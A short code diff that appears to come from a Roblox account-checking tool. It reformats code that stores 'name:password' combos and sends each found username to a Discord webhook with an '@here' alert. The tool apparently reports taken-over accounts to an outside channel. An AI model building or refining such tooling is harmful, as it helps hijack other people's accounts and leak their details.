@@ -540,17 +540,20 @@ class Roblox:
 
 
             combo = f"{multiple_account.get('name')}:{self.account[1]}\n"
-            self.accounts.insert(self.counter.get_value() + 1, combo)
+        self.accounts.insert(self.counter.get_value() + 1, combo)
 
         if WEBHOOK_ENABLED:
             try:
                 webhook = DiscordWebhook(url=WEBHOOK, content="@here")
 
-                embed = DiscordEmbed(title=f'**Username: {self.account[0]}**', color='00FF00')
+                embed = DiscordEmbed(
+                    title=f'**Username: {self.account[0]}**',
+                    color='00FF00'
+                )
 
                 embed.set_timestamp()
 
                 webhook.add_embed(embed)
                 webhook.execute()
-            except:
+            except Exception:
                 pass
